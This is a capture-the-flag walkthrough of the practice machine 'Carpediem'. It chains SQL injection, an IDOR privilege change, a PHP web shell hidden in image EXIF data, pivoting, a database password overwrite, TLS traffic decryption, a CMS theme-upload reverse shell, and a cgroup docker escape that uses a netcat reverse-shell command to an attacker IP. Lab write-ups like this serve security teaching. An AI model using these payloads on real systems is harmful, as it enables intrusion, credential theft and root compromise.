<h2>Target: 10.10.11.167 Carpediem</h2>

<b>Initial Access:</b><br>
nmap -Pn 10.10.11.167 --min-rate=5000 -p-|grep open|awk -F '/' '{print $1}'|tr '\n' ',' <br>
Output shows open ports 22 and 80.

Enumerate these open ports further with nmap: <br>
nmap -Pn 10.10.11.167 --min-rate=5000 -p 22,80 -sC -sV -oN nmap.carpediem <br>
Output shows:

![image](https://user-images.githubusercontent.com/93153300/204039179-78ce0596-f325-476c-ad5f-09411b9a88f6.png)
 
Visiting port 80 shows: 
 
![image](https://user-images.githubusercontent.com/93153300/204039191-62a499be-cd98-45b2-9933-bf937e425914.png)

The site shows that it uses a domain name of Carpediem.htb.  Before checking the website ‘Carpediem.htb’  add into the file /etc/hosts: 10.10.11.167  Carpediem.htb <br>
Visiting Carpediem.htb shows the same exact web page.   The ‘subscribe’ doesn’t work, and there’s not much left to do here.  Run subdomain brute force with wfuzz:<br>
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.carpediem.htb" -u "http://Carpediem.htb" --hh 2875

Wfuzz found a subdomain: portal.carpediem.htb.  Add ‘portal.carpediem.htb’ to /etc/hosts.   Visiting the page shows:

![image](https://user-images.githubusercontent.com/93153300/204039218-c6732449-649b-4e3f-9d21-bf298e291aff.png)
 
Click on ‘Categories’ dropdown (top of the page) and then click on ‘Adventure Bike’.  After clicking on ‘Adventure Bike’, the page shows: 

![image](https://user-images.githubusercontent.com/93153300/204039233-bad863b3-9b6a-40a1-ba86-1fd107a5fbc5.png)

Test for sql injection on query parameter ‘c=’  in the url with query: http://portal.carpediem.htb/?p=bikes&c=’or (select ‘a’)=’a’-- -

The page strangely returns a string of ‘Scooter’:

![image](https://user-images.githubusercontent.com/93153300/204039241-197b8aa1-eca9-4743-956b-494e2ffd09a7.png)

This is likely vulnerable to sql injection.  To save time, use sqlmap for further testing and exploitation:  
sqlmap -u 'http://portal.carpediem.htb/?p=bikes&c=a' -p c --batch --cookie "PHPSESSID=740b4def22406b3f7938eb27594e43b4" --dbs -D portal --tables -T users --columns -C username,password --dump

Sqlmap found username ‘admin’ and password hash ‘b723e511b084ab84b44235d82da572f3’.<br> 
Using john or hashcat to try and crack the hash fails.  Seems like a rabbit hole, let’s go back and enumerate some more.  Run directory brute force on the site: dirsearch -r -u http://portal.carpediem.htb

Dirsearch found a directory ‘/admin’ that looks interesting.  Visiting the ‘/admin’ directory shows ‘Access Denied!’: 

![image](https://user-images.githubusercontent.com/93153300/204039291-ac710c72-89af-4bca-b96a-fa05029e12e1.png)

We can’t access the ‘/admin’ directory.  Going back to the site, click on ‘Login’ and then ‘Create an Account’.  After creating an account and logging in the page shows:

![image](https://user-images.githubusercontent.com/93153300/204039324-274408c0-d6a3-45ba-bc80-2588f7f35bb1.png)
 
The name we chose when creating an account is John, so the top right corner of the page shows ‘Hi, John!’.   Click on ‘Hi, John!’ and then click on ‘Manage Account’.  The page shows that we can update our account: 

![image](https://user-images.githubusercontent.com/93153300/204039336-e610c26b-bda4-4369-97ef-ae52a59ff4ef.png)

Capture the ‘Update’ request in burp suite:

![image](https://user-images.githubusercontent.com/93153300/204039348-66fa8142-fd91-4d4e-bb3e-e92079ec474b.png)
 
Burp suite at the bottom shows a body parameter of ‘login_type=2’.  Change that to ‘login_type=1’ and then forward the request. This attack is called an insecure direct object reference.  The number 1 is usually for an admin account to give admin permissions to the user.  Next, visit the ‘/admin’ directory once again.  It works, we are now able to access the ‘/admin’ directory.  The page shows:

![image](https://user-images.githubusercontent.com/93153300/204039357-ea80dae4-e849-47c5-85f8-e15db79bf74d.png)

Click on our username in the top right corner (our username is ‘John wick’) and then click on ‘My Account’.  The page shows:

![image](https://user-images.githubusercontent.com/93153300/204039371-95f756a1-393f-405d-a91e-9d5f61bfebaa.png)

On this page we can upload files for the user’s ‘Avatar’.  The site will only allow uploads of a file that actually contains an image.  Therefore, we will use exiftool to put the php command shell payload in the comment section of an image file: <br>
exiftool -Comment='<?php echo "<pre>"; system($_GET["cmd"]); ?>' gnome-dev-ipod.png

The site also blocks uploading any file containing a php file extension.  In order to bypass this filter we will upload a file with an extension of png, capture the request in burp suite, in burp suite change the extension of the file to php, and then forward the request:  

![image](https://user-images.githubusercontent.com/93153300/204039386-2f3d9b65-6bff-403b-8672-5fbaf2acfb50.png)
 
To use this uploaded file, we need to find where it’s stored.  Look at the source code (control U):

![image](https://user-images.githubusercontent.com/93153300/204039396-270341b9-c1a6-4d6c-953f-3942ff7fdf9f.png)

The source code shows the location of the uploaded file.  Visiting that location and trying a proof of concept with command ‘id’:

![image](https://user-images.githubusercontent.com/93153300/204039409-7d94d22a-cb7b-4495-8209-d5b054df45aa.png)

The page shows that command ‘id’ ran successfully.  Next, capture the request in burp suite, send the request to ‘Repeater’, replace the command ‘id’ with a reverse shell, and then url encode the key characters:

![image](https://user-images.githubusercontent.com/93153300/204039423-d0290c08-09a5-4da6-91eb-37c2548cb294.png)

Open a netcat listener to catch the reverse shell (we will use pwncat as it gives a better shell): pwncat-cs -lp 443 

Send the request.  We now have a shell as user www-data.  
________________________________________________________________________
<b>Lateral Movement:</b><br>
We find ourselves in a docker:

![image](https://user-images.githubusercontent.com/93153300/204039447-5f893f43-cd7b-441b-9eef-6eb1e5e45705.png)

File /var/www/html/portal/classes/Trudesk.php shows a subdomain: 

![image](https://user-images.githubusercontent.com/93153300/204039456-4f6e6336-1ed7-4ed7-b605-4b1cdbaa01be.png)
 
Add this subdomain on our local kali to the file /etc/hosts. Visiting http://trudesk.carpediem.htb shows a login page:

![image](https://user-images.githubusercontent.com/93153300/204039467-0e17adf5-c732-4a7b-97e2-a8804a37dd6b.png)

We don’t have credentials for the login page.  Continue enumeration on the target.  File /var/www/html/portal/classes/DBConnection.php has mysql credentials:

![image](https://user-images.githubusercontent.com/93153300/204039488-6297abb4-9758-43bd-af31-75a749893a7e.png)
  
Trying to connect to mysql from the target fails as it doesn’t have the ‘mysql’ command.
Upload nmap to the target and scan the network:  ./nmap -Pn --min-rate=5000 172.17.0.1-10

![image](https://user-images.githubusercontent.com/93153300/204039500-75310e55-dc76-4467-afab-a3e2ad51b956.png)
 
Our nmap scan shows a number of ip addresses with open ports that we will look into.  Since we found mysql credentials let’s start with connecting to mysql.  We will perform dynamic port forwarding in order to check mysql and the other open ports we found. Here are the steps for dynamic port forwarding using chisel:

Step 1: Run chisel on our kali locally: ./chisel server -p 1111 --reverse <br>
Step 2: Upload chisel to the target and give it executable permissions.<br>
Step 3: Run chisel on the target to connect to our local chisel server: ./chisel client 10.10.14.108:1111 R:2222:socks <br>
Step 4: On our local kali edit the file /etc/proxychains.conf.  Go to the bottom of the proxychains.conf file (under ProxyList) and add: socks5 127.0.0.1 2222.

On our local kali, connect to the mysql target with proxychains: proxychains mysql -h 172.17.0.3 -u portaldb -D portal -p

Nothing of interest found on mysql.  Take a look at another one of our nmap findings.  Connect to mongo on 172.17.0.2:   proxychains mongo 172.17.0.2

Now that we are logged into mongo, check out the databases and collections.  The commands used for this are listed below: 

![image](https://user-images.githubusercontent.com/93153300/204039518-ffb159ce-a779-4678-98bc-3ca2d7e5c5c3.png)

We found the usernames and hashed passwords to trudesk which we should be able to use to login on the trudesk subdomain we found.  However, trying to crack these hashes with john and hashcat failed.  

Instead of trying to crack these hashes, replace the current hashed password for the admin user of trudesk with a password that we create.  Based on the prefix of the hashed passwords, `$2b$10$`, we know this is bcrypt.  Create a bcrypt hashed password of ‘johnwick’ with the following command: <br>
mkpasswd johnwick --method=bcrypt -R 10 

Output for the bcrypt password is: $2b$10$hlR45AWOiInPLVA3bza3OuQupb7CX8RlaMOZYYqzTZDwtawo6vLuy

The command for updating a value in mongo is: db.accounts.updateOne( { username: "admin" },{  $set: { password: "$2b$10$hlR45AWOiInPLVA3bza3OuQupb7CX8RlaMOZYYqzTZDwtawo6vLuy" }}) 

Go back to the trudesk subdomain site and login with username ‘admin’ and password ‘johnwick’.  Click on ‘Tickets’ → ‘Active’ → ‘New employee on-boarding’.  This page shows messages:

![image](https://user-images.githubusercontent.com/93153300/204039542-c68a40df-3dc2-4dfa-b3b6-ec378bef78ca.png)

The messages explains how to get Horace’s credentials.  To summarize the important details in the messages:

zoiper username: 9650<br>
zoiper password: 2022<br>
zoiper domain name: carpediem.htb<br>
zoiper call number: *62<br>
zoiper pin code: 2022<br>

Download zoiper to our local kali, and use the message information to login.  

![image](https://user-images.githubusercontent.com/93153300/204039566-f4e557d0-338f-4415-ba17-caa2caeb79e6.png)

Once logged in, dial the number given and enter the pin code to hear the message.  The message gives us the password: AuRj4pxq9qPk

We don’t have a username, but we can guess the username based off of all the usernames we found in mongo.  It’s the first letter of the first name, and then the full last name: hflaccus

Login to hflaccus via ssh: ssh hflaccus@carpediem.htb.  We have shell as user hflaccus.  We can get the flag in /home/hflaccus/user.txt
__________________________________________________________________________________
<b>Lateral Movement:</b><br>
Upload linpeas.sh to the target and run it.  Linpeas found:<br>
`You can sniff with tcpdump!`<br>
`/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip`<br>
`/etc/ssl/certs/backdrop.carpediem.htb.key`

Command ‘ifconfig’ on the target shows eth0 and docker0. Run tcpdump to see if we can capture something interesting and write the tcpdump output to a file: tcpdump -i docker0 -w  cap.pcap

Tcpdump captured encrypted packets.  To decrypt these packets we will use the file /etc/ssl/certs/backdrop.carpediem.htb.key that we found with linpeas.  Download to our kali the  backdrop.carpediem.htb.key file and the tcpdump captured file cap.pcap.  Open the cap.pcap with wireshark.  To decrypt the data we need to add the backdrop.carpediem.htb.key file to wireshark.  To do this click on edit → preferences  → RSA keys → Add new keyfile.  Reopen wireshark  → right click on a packet thats shows a POST login→  click on ‘Follow HTTP Stream’ and we can now see the data unencrypted:

![image](https://user-images.githubusercontent.com/93153300/204039579-62b8404f-d77a-4132-99cd-b0c1582eebe0.png)
 
The packet shows a login to https://backdrop.carpediem.htb:8002 with username jpardella and password tGPN6AmJDZwYWdhY.

Running command ‘netstat -ln’ shows that port 8002 is only accessible locally:

![image](https://user-images.githubusercontent.com/93153300/204039602-1c120d9c-5879-45a0-ae1b-b6b3a6b19e24.png)

To access port 8002 we will use our dynamic port forward we made with chisel earlier.  To navigate through our dynamic port forward with ease we will configure foxyproxy:

![image](https://user-images.githubusercontent.com/93153300/204042637-e1e228ea-14a7-4bac-a32b-22b8eb333a11.png)
 
This configuration in foxyproxy sends all requests through 127.0.0.1:2222.  Navigate to https://127.0.0.1:8002.   Use the credentials we found with wireshark to login.  Looking around on the site we find it is using backdrop CMS version 1.21.4:

![image](https://user-images.githubusercontent.com/93153300/204039632-da6664f0-9bd7-4126-bcb5-74dcba6d9fec.png)

Search google for ‘backdrop cms 1.21 exploit’.  We find that we can to add a theme that will contain a reverse shell.  

![image](https://user-images.githubusercontent.com/93153300/204039647-d23691de-b4ff-4c12-8713-ae297adcc7f7.png)

Follow these steps for uploading the reverse shell and running it:<br>
Step 1: Download backdrop cms theme to our local kali: git clone https://github.com/backdrop-contrib/lateral.git <br>
Step 2: Add a php pentestmonkey reverse shell file into the lateral directory we just downloaded from github.<br>
Step 3: After some testing on the site https://127.0.0.1:8002, we find that the upload has certain filters in place.  The page allows tar uploads, and only allows up to 2MB size.  To get the size under 2MB, delete all the files in the 'lateral' directory except for the reverse shell file we added and the ‘lateral.info’ file (as the site checks for the ‘lateral.info’ file).  Next, turn the 'lateral' directory into a tar file: tar -cvf lateral.tar lateral <br>
Step 4: On the https://127.0.0.1:8002 site, click on appearance → Install new themes → Manual installation → browse → upload the lateral.tar file we made.  <br>
Step 5: Open a netcat reverse shell (we will use pwncat as it gives a better shell): pwncat-cs -lp 443 <br>
Step 6: To activate the reverse shell navigate to https://127.0.0.1:8002/themes/lateral/revshell.php

We now have a shell as user www-data in a docker on 172.17.0.2.
________________________________________________________________
<b>Docker Privilege Escalation:</b><br>
Read file /opt/heartbeat.sh:

![image](https://user-images.githubusercontent.com/93153300/204039661-c100ebca-d781-41a9-a86d-4decfce19cc8.png)

This file shows a script for a cron running every 10 seconds (checking with pspy confirms this cron).  If we replace /var/www/html/backdrop/index.php with a php reverse shell then we can get shell as root.  
  
Step 1: Open a netcat listener: nc -lvnp 443 <br>
Step 2: Change file /var/www/html/backdrop/index.php to a pentestmonkey php reverse shell. <br>
Step 3: Wait a few seconds.  We now have shell as user root within the docker  
____________________________________________________________________
<b>Docker Escape Privilege Escalation:</b><br>
Below are the commands for the docker escape we will perform.  For  understanding on how the docker escape works read: https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/

Step 1: On our local kali, run a netcat listener: nc -lvnp 443
Step 2: unshare -UrmC bash <br>
Step 3: mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && host_path=\`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab\` && echo "$host_path/cmd" > /tmp/cgrp/release_agent && echo '#!/bin/sh' > /cmd && echo "nc 10.10.14.108 443 -e /bin/bash" >> /cmd && chmod a+x /cmd && sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs" 

Our netcat listener received a shell as root, and we have escaped the docker.  We can get the flag in /root/root.txt
